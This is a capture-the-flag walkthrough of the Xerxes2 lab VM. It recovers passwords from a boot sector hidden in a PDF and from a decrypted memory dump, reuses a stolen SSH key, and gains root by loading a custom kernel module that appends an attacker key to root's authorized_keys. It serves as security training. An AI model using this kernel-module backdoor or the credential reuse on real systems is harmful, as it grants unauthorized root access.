+<figure class='code'><figcaption><span>polito.pdf headers</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
+</span><span class='line'>00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&lt;&lt;&gt;&gt;.str
+</span><span class='line'>00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
+</span><span class='line'>00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
+</span><span class='line'>00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
+</span><span class='line'>00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
+</span><span class='line'>00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
+</span><span class='line'>00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
+</span><span class='line'>00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
+</span><span class='line'>00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
+</span><span class='line'>000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
+</span><span class='line'>000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
+</span><span class='line'>000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
+</span><span class='line'>000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
+</span><span class='line'>000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
+</span><span class='line'>000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
+</span><span class='line'>00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
+</span><span class='line'>00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
+</span><span class='line'>00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
+</span><span class='line'>000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
+</span><span class='line'>00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# head -c 512 polito.pdf &gt; first
+</span><span class='line'>root@kali:~# file -k first
+</span><span class='line'>first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo<span class="o">(</span>s<span class="o">)</span> <span class="o">(</span>1146103071 records<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>root@kali:~# tail -c +512 polito.pdf &gt; second
+</span><span class='line'>root@kali:~# file second
+</span><span class='line'>second: Dyalog APL
+</span><span class='line'>root@kali:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>
+
+<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>
+
+<p><img src="https://i.imgur.com/1HFOfwc.png"></p>
+
+<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>
+
+<figure class='code'><figcaption><span>GPG decrypt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>gpg -d dump.gpg &gt; decrypted_dump
+</span><span class='line'>gpg: CAST5 encrypted data
+</span><span class='line'>gpg: encrypted with 1 passphrase
+</span><span class='line'>gpg: WARNING: message was not integrity protected
+</span><span class='line'>
+</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file decrypted_dump
+</span><span class='line'>decrypted_dump: data
+</span><span class='line'>
+</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -lh decrypted_dump
+</span><span class='line'>-rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>
+
+<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>
+
+<figure class='code'><figcaption><span>Finding korenchkin.tar.enc password</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>grep <span class="k">$(</span>ls /opt/backup/<span class="k">)</span> decrypted_strings
+</span><span class='line'>korenchkin.tar.enc
+</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>
+
+<figure class='code'><figcaption><span>decrypting korenchkin.tar.enc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar
+</span><span class='line'>
+</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file korenchkin.tar
+</span><span class='line'>korenchkin.tar: POSIX tar archive <span class="o">(</span>GNU<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>tar xvf korenchkin.tar
+</span><span class='line'>.ssh/id_rsa
+</span><span class='line'>.ssh/id_rsa.pub
+</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>
+
+<figure class='code'><figcaption><span>SSH as korenchkin</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102
+</span><span class='line'>
+</span><span class='line'>Welcome to xerxes2.
+</span><span class='line'>      XERXES wishes you
+</span><span class='line'>       a pleasant stay.
+</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
+</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
+</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
+</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
+</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
+</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
+</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
+</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
+</span><span class='line'>
+</span><span class='line'>You have new mail.
+</span><span class='line'>korenchkin@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>You have new mail.</em></p>
+
+<h2>becoming root</h2>
+
+<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>
+
+<figure class='code'><figcaption><span>korenchkin sudo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>sudo -l
+</span><span class='line'>Matching Defaults entries <span class="k">for </span>korenchkin on this host:
+</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span class='line'>
+</span><span class='line'>User korenchkin may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/insmod, <span class="o">(</span>root<span class="o">)</span> /sbin/rmmod
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>
+
+<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>
+
+<figure class='code'><figcaption><span>hello.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;linux/module.h&gt;       </span><span class="cm">/* Needed by all modules */</span><span class="cp"></span>
+</span><span class='line'><span class="cp">#include &lt;linux/kernel.h&gt;       </span><span class="cm">/* Needed for KERN_INFO */</span><span class="cp"></span>
+</span><span class='line'><span class="cp">#include &lt;linux/init.h&gt;         </span><span class="cm">/* Needed for the macros */</span><span class="cp"></span>
+</span><span class='line'>
+</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">hello_start</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;Loading hello module...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">hello_end</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;Goodbye Mr.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">module_init</span><span class="p">(</span><span class="n">hello_start</span><span class="p">);</span>
+</span><span class='line'><span class="n">module_exit</span><span class="p">(</span><span class="n">hello_end</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>hello Makefile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='make'><span class='line'><span class="nv">obj-m</span> <span class="o">+=</span> hello.o
+</span><span class='line'>
+</span><span class='line'><span class="nf">all</span><span class="o">:</span>
+</span><span class='line'>    make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
+</span><span class='line'>
+</span><span class='line'><span class="nf">clean</span><span class="o">:</span>
+</span><span class='line'>    make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>
+
+<figure class='code'><figcaption><span>hello kernel module testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>make
+</span><span class='line'>make -C /lib/modules/3.2.0-4-686-pae/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/kern modules
+</span><span class='line'>make<span class="o">[</span>1<span class="o">]</span>: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/kern/hello.o</span>
+</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
+</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
+</span><span class='line'><span class="s1">  CC      /home/korenchkin/kern/hello.mod.o</span>
+</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/kern/hello.ko</span>
+</span><span class='line'><span class="s1">make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>sudo insmod hello.ko
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>dmesg <span class="p">|</span> tail
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>68192.983366<span class="o">]</span> hello: module license <span class="s1">&#39;unspecified&#39;</span> taints kernel.
+</span><span class='line'><span class="o">[</span>68192.983369<span class="o">]</span> Disabling lock debugging due to kernel taint
+</span><span class='line'><span class="o">[</span>68192.983637<span class="o">]</span> Loading hello module...
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>
+
+<p><em>insert loud crash and burn sound here</em></p>
+
+<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>
+
+<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>
+
+<figure class='code'><figcaption><span>Rewritten hello.c to rooted.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#include &lt;linux/module.h&gt;       /* Needed by all modules */</span>
+</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span>
+</span><span class='line'><span class="c">#include &lt;linux/init.h&gt;         /* Needed for the macros */</span>
+</span><span class='line'>
+</span><span class='line'>/* For our shell ^_^ */
+</span><span class='line'><span class="c">#include&lt;linux/kmod.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'>int get_root <span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>
+</span><span class='line'>    char * envp<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span> <span class="s2">&quot;HOME=/&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
+</span><span class='line'>    char *argv<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span> <span class="s2">&quot;/bin/bash&quot;</span>, <span class="s2">&quot;-c&quot;</span>, <span class="s2">&quot;/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys&quot;</span>, NULL<span class="o">}</span><span class="p">;</span>
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Call Usermodehelper...\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    call_usermodehelper<span class="o">(</span>argv<span class="o">[</span>0<span class="o">]</span>, argv, envp, UMH_WAIT_EXEC<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Done usermodehelper...\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>static int __init hello_start<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Loading rooted module...\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">return </span>get_root<span class="o">()</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>static void __exit hello_end<span class="o">(</span>void<span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Goodbye Mr.\n&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>module_init<span class="o">(</span>hello_start<span class="o">)</span><span class="p">;</span>
+</span><span class='line'>module_exit<span class="o">(</span>hello_end<span class="o">)</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>
+
+<figure class='code'><figcaption><span>Xerxes2 rooting</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>vi rooted.c
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>vi Makefile
+</span><span class='line'>
+</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>make
+</span><span class='line'>make -C /lib/modules/3.2.0-4-686-pae/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/kern modules
+</span><span class='line'>make<span class="o">[</span>1<span class="o">]</span>: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/kern/rooted.o</span>
+</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
+</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
+</span><span class='line'><span class="s1">  CC      /home/korenchkin/kern/rooted.mod.o</span>
+</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/kern/rooted.ko</span>
